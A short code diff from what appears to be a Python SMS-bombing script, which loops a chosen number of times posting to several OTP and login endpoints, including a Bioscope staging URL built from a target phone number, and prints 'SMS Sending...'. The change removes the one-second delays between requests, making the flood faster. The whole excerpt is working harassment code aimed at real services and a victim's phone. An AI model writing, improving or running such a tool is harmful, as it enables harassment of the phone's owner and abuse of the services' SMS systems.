@@ -44,10 +44,8 @@ api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operato
 print(G + "SMS Sending...")
 sleep(1)
 for j in range(amount):
-    resp = requests.post(binge1, headers=headers1, data=data1)
-    sleep(1)
+    resp = requests.post(binge1, headers=headers1, data=data1) 
     resp1 = requests.post(url, headers=headers2)
-    sleep(1)
     requests.get(api)
         
     print("")
